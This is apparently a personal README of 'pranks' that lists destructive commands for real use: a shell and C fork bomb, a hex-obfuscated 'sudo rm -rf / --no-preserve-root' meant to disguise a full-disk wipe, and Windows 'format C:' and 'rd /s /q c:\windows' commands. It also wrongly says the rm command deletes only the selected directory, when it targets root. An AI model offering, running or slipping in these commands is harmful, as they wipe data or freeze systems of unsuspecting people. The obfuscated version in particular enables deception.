# pranks
These are my notes on bad things that can happen.  The focus here is programmatic stuff, if application security is your thing then you should check out OWASP Top 10 documentation!  [Click here for the 2017 version of that.](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
  
## Terminal Commands
For use in a terminal or a command prompt or something  
  
### Fork Bomb
A form of DOS (denial of service) attack.  
The process continually replicates itself to deplete available system resources.  
In shell, it looks like this:  
```shell
:(){ :|: & };:
```
Also possible in C like this:
```c
int main() {
    while(1)
        fork();
    return 0;
}
```
### Deletion
First off, here are some hex shenanigans:
```shell
$(echo 7375646f20726d202d7266202f202d2d6e6f2d70726573657276652d726f6f74 | xxd -r -p)
```
This is hexidecimal, but converted to ascii its:
```shell
sudo rm -rf / --no-preserve-root
```
Which will delete everything from the selected directory.  
This does the same thing in Windows:  
```shell
Format C: /q /y
```
```shell
rd /s /q c:\windows
```
supposedly delete windows, but windows will probably try to stop you
idk I never actually tested it lol

